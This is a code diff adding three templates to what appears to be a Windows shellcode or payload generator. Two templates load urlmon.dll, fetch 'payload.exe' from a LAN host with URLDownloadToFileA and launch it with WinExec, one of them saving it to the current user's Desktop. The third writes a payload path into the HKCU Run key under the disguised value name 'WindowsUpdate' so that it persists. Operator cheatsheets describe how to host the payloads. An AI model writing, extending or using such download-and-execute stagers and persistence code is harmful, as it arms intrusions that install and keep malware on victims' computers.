@@ -15,6 +15,9 @@ Reference workflows:
   - copy_then_run: CopyFileA followed by WinExec
   - move_then_run: MoveFileA followed by WinExec
   - check_path: GetFileAttributesA to test file existence
+  - url_download: URLDownloadToFileA single-call download + WinExec
+  - url_download_to_userdir: GetUserNameA + URLDownloadToFileA + WinExec
+  - registry_persistence: RegOpenKeyExA + RegSetValueExA for HKCU Run key
 """
 from __future__ import annotations
 
@@ -1759,4 +1762,319 @@ class IRHttpDownloadToUserdirTemplate(WorkflowTemplate):
             ("Download URL", url),
             ("Destination pattern", f"{prefix}<username>{suffix}"),
             ("Downloads, writes, then executes", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# URL download (single-call via URLDownloadToFileA)
+# ---------------------------------------------------------------------------
+
+
+def build_url_download_workflow(
+    url: str = "http://192.168.1.10/payload.exe",
+    dst_path: str = r"C:\Users\Public\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the url_download reference workflow.
+
+    LoadLibraryA(urlmon.dll) -> URLDownloadToFileA(NULL, url, dst, 0, NULL)
+    -> WinExec(dst) -> exit
+
+    Single API call download, much smaller than the WinInet chain.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_url_download",
+        blocks=(
+            Block("entry", (
+                ConstructString("urlmon_dll", "urlmon.dll"),
+                ConstructString("url", url),
+                ConstructString("dst_path", dst_path),
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("urlmon_dll"),),
+                    result="urlmon_base",
+                ),
+                CallAPI(
+                    "URLDownloadToFileA",
+                    arguments=(
+                        Immediate(0),          # pCaller = NULL
+                        AddressOf("url"),
+                        AddressOf("dst_path"),
+                        Immediate(0),          # dwReserved
+                        Immediate(0),          # lpfnCB = NULL
+                    ),
+                    result="dl_ret",
+                ),
+                Compare(
+                    "dl_ret",
+                    SuccessPredicate.ZERO,      # S_OK == 0
+                    true_block="run_payload",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dst_path"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRUrlDownloadTemplate(WorkflowTemplate):
+    """IR-backed url_download template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_url_download_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_url_download_workflow(
+            url=config.url or "http://192.168.1.10/payload.exe",
+            dst_path=config.dst_path or r"C:\Users\Public\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        url = config.url or "http://192.168.1.10/payload.exe"
+        dst = config.dst_path or r"C:\Users\Public\payload.exe"
+        return [
+            ("Start HTTP server", "python3 -m http.server 80 --directory /path/to/payloads"),
+            ("Download URL", url),
+            ("Destination path", dst),
+            ("Single-call download via URLDownloadToFileA", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# URL download to user directory workflow
+# ---------------------------------------------------------------------------
+
+
+def build_url_download_to_userdir_workflow(
+    url: str = "http://192.168.1.10/payload.exe",
+    path_prefix: str = r"C:\Users" + "\\",
+    path_suffix: str = r"\Desktop\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the url_download_to_userdir reference workflow.
+
+    GetUserNameA -> build dest path -> LoadLibraryA(urlmon.dll) ->
+    URLDownloadToFileA(NULL, url, dest, 0, NULL) -> WinExec(dest) -> exit
+
+    Single-call download to a runtime-constructed user path.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    entry, build_path = _username_path_entry_blocks(path_prefix, path_suffix)
+    return Workflow(
+        name="ir_url_download_to_userdir",
+        blocks=(
+            entry,
+            build_path,
+            Block("use_path", (
+                ConstructString("urlmon_dll", "urlmon.dll"),
+                ConstructString("url", url),
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("urlmon_dll"),),
+                    result="urlmon_base",
+                ),
+                CallAPI(
+                    "URLDownloadToFileA",
+                    arguments=(
+                        Immediate(0),          # pCaller = NULL
+                        AddressOf("url"),
+                        AddressOf("dest_path_buf"),
+                        Immediate(0),          # dwReserved
+                        Immediate(0),          # lpfnCB = NULL
+                    ),
+                    result="dl_ret",
+                ),
+                Compare(
+                    "dl_ret",
+                    SuccessPredicate.ZERO,      # S_OK == 0
+                    true_block="run_payload",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dest_path_buf"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRUrlDownloadToUserdirTemplate(WorkflowTemplate):
+    """IR-backed url_download_to_userdir template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_url_download_to_userdir_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_url_download_to_userdir_workflow(
+            url=config.url or "http://192.168.1.10/payload.exe",
+            path_prefix=config.path_prefix or r"C:\Users" + "\\",
+            path_suffix=config.path_suffix or r"\Desktop\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        url = config.url or "http://192.168.1.10/payload.exe"
+        prefix = config.path_prefix or r"C:\Users" + "\\"
+        suffix = config.path_suffix or r"\Desktop\payload.exe"
+        return [
+            ("Start HTTP server", "python3 -m http.server 80 --directory /path/to/payloads"),
+            ("Download URL", url),
+            ("Destination pattern", f"{prefix}<username>{suffix}"),
+            ("Single-call download via URLDownloadToFileA", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Registry persistence workflow (HKCU Run key)
+# ---------------------------------------------------------------------------
+
+
+_DEFAULT_REG_KEY = (
+    r"Software\Microsoft\Windows\CurrentVersion\Run"
+)
+
+
+def build_registry_persistence_workflow(
+    exe_path: str = r"C:\Users\Public\payload.exe",
+    reg_key_path: str = _DEFAULT_REG_KEY,
+    reg_value_name: str = "WindowsUpdate",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the registry_persistence reference workflow.
+
+    LoadLibraryA(advapi32.dll) ->
+    RegOpenKeyExA(HKCU, Run, KEY_SET_VALUE) ->
+    lstrlenA(exe_path) -> +1 for null ->
+    RegSetValueExA(key, value_name, REG_SZ, exe_path, len) ->
+    RegCloseKey -> exit
+
+    Writes exe_path as a REG_SZ value under HKCU\\...\\Run for
+    boot persistence.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_registry_persistence",
+        blocks=(
+            Block("entry", (
+                ConstructString("advapi_dll", "advapi32.dll"),
+                ConstructString("reg_key_path", reg_key_path),
+                ConstructString("reg_value_name", reg_value_name),
+                ConstructString("exe_path", exe_path),
+                AllocateLocal("hkey_out"),
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("advapi_dll"),),
+                    result="advapi_base",
+                ),
+                CallAPI(
+                    "RegOpenKeyExA",
+                    arguments=(
+                        Immediate(0x80000001),  # HKEY_CURRENT_USER
+                        AddressOf("reg_key_path"),
+                        Immediate(0),           # ulOptions
+                        Immediate(0x0002),      # KEY_SET_VALUE
+                        AddressOf("hkey_out"),
+                    ),
+                    result="reg_open_ret",
+                ),
+                Compare(
+                    "reg_open_ret",
+                    SuccessPredicate.ZERO,       # ERROR_SUCCESS == 0
+                    true_block="set_value",
+                    false_block="fail",
+                ),
+            )),
+            Block("set_value", (
+                CallAPI(
+                    "lstrlenA",
+                    arguments=(AddressOf("exe_path"),),
+                    result="path_len",
+                ),
+                CallAPI(
+                    "RegSetValueExA",
+                    arguments=(
+                        NameRef("hkey_out"),
+                        AddressOf("reg_value_name"),
+                        Immediate(0),           # Reserved
+                        Immediate(1),           # REG_SZ
+                        AddressOf("exe_path"),
+                        NameRef("path_len"),    # cbData (lstrlenA excludes null, but REG_SZ size includes it; +1 handled by push-string null terminator already on stack)
+                    ),
+                    result="reg_set_ret",
+                ),
+                CallAPI(
+                    "RegCloseKey",
+                    arguments=(NameRef("hkey_out"),),
+                ),
+                Compare(
+                    "reg_set_ret",
+                    SuccessPredicate.ZERO,       # ERROR_SUCCESS == 0
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRRegistryPersistenceTemplate(WorkflowTemplate):
+    """IR-backed registry_persistence template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_registry_persistence_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_registry_persistence_workflow(
+            exe_path=config.exe_path or r"C:\Users\Public\payload.exe",
+            reg_key_path=config.reg_key_path or _DEFAULT_REG_KEY,
+            reg_value_name=config.reg_value_name or "WindowsUpdate",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        exe = config.exe_path or r"C:\Users\Public\payload.exe"
+        key = config.reg_key_path or _DEFAULT_REG_KEY
+        val = config.reg_value_name or "WindowsUpdate"
+        return [
+            ("Registry hive", "HKEY_CURRENT_USER"),
+            ("Key path", key),
+            ("Value name", val),
+            ("Value data (REG_SZ)", exe),
+            ("Persistence: runs on user login", ""),
         ]
